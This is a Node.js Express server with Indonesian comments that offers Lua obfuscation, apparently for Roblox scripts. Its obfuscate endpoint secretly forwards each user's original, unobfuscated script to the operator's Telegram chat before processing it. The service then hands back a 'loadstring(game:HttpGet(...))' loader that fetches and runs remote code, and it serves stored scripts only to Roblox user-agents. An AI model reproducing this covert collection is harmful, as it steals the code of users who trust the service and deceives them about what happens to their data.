const express = require('express');
const cors = require('cors');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================================
//  KONFIGURASI TELEGRAM — isi dengan data bot kamu
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'ISI_TOKEN_BOT_KAMU';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || 'ISI_CHAT_ID_KAMU';
// ============================================================

// Database sederhana untuk menyimpan script
const scriptDatabase = new Map();

// Memastikan folder temp selalu ada
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

// ─── FUNGSI KIRIM NOTIF KE TELEGRAM ─────────────────────────
function sendTelegram(text) {
    const payload = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => console.log('[TELEGRAM]', data));
    });
    req.on('error', err => console.error('[TELEGRAM ERROR]', err));
    req.write(payload);
    req.end();
}

// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM ───────────────────
function sendTelegramFile(scriptContent, scriptId) {
    // Potong jika terlalu panjang (Telegram max 4096 char per pesan)
    const preview = scriptContent.length > 3500
        ? scriptContent.slice(0, 3500) + '\n\n... [TRUNCATED]'
        : scriptContent;

    const msg =
`🔔 <b>Script Baru Diobfuskasi!</b>

🆔 <b>Script ID:</b> <code>${scriptId}</code>
📏 <b>Panjang:</b> ${scriptContent.length} karakter
🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC

📄 <b>Isi Script Original:</b>
<pre>${preview.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</pre>`;

    sendTelegram(msg);

}

// ─── FUNGSI OBFUSKASI PROMETHEUS ────────────────────────────
function obfuscateWithPrometheus(scriptContent) {
    return new Promise((resolve, reject) => {
        const tempId = Date.now();
        const inputPath  = path.join(tempDir, `input_${tempId}.lua`);
        const outputPath = path.join(tempDir, `input_${tempId}.obfuscated.lua`);

        fs.writeFileSync(inputPath, scriptContent);

        const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
        const command = `lua5.3 "${prometheusPath}" --preset Medium "${inputPath}"`;

        console.log("Menjalankan command:", command);

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error("=== ERROR DARI PROMETHEUS ===");
                console.error(error);
                console.error("STDERR:", stderr);
                if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
                return reject("Gagal mengobfuskasi kode (Cek Log Railway).");
            }

            if (fs.existsSync(outputPath)) {
                const obfuscatedCode = fs.readFileSync(outputPath, 'utf8');
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
                resolve(obfuscatedCode);
            } else {
                console.error("=== ERROR OUTPUT ===");
                console.error("File output tidak ditemukan di:", outputPath);
                reject("File output tidak ditemukan.");
            }
        });
    });
}

// ─── ENDPOINT OBFUSKASI ──────────────────────────────────────
app.post('/api/obfuscate', async (req, res) => {
    const { script } = req.body;
    if (!script) return res.status(400).json({ error: "Script kosong!" });

    try {
        console.log("Menerima request obfuscate...");

        // Kirim script original ke Telegram SEBELUM diobfus
        const tempId = Date.now().toString();
        sendTelegramFile(script, tempId);

        const obfuscatedCode = await obfuscateWithPrometheus(script);

        const scriptId = Math.floor(Math.random() * 10000000000000).toString();
        scriptDatabase.set(scriptId, obfuscatedCode);

        const protocol = req.headers['x-forwarded-proto'] || req.protocol;
        const host = req.headers['x-forwarded-host'] || req.headers.host;
        const loaderScript = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;

        res.json({ success: true, loader: loaderScript });
    } catch (error) {
        console.error("=== ERROR UMUM ===");
        console.error(error);
        res.status(500).json({ error: error.toString() });
    }
});

// ─── ENDPOINT SCRIPTS (DILINDUNGI) ──────────────────────────
app.get('/Scripts', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';

    // Blokir semua request yang bukan dari Roblox
    if (!userAgent.includes('Roblox')) {
        return res.status(403).sendFile(path.join(__dirname, 'public', '403.html'));
    }

    const scriptId   = req.query.Id;
    const scriptCode = scriptDatabase.get(scriptId);

    if (scriptCode) {
        res.setHeader('Content-Type', 'text/plain');
        res.send(scriptCode);
    } else {
        res.status(404).send("-- Script tidak ditemukan / Kadaluarsa");
    }
});

// ─── START SERVER ────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server berjalan mantap di port ${PORT}`);
});
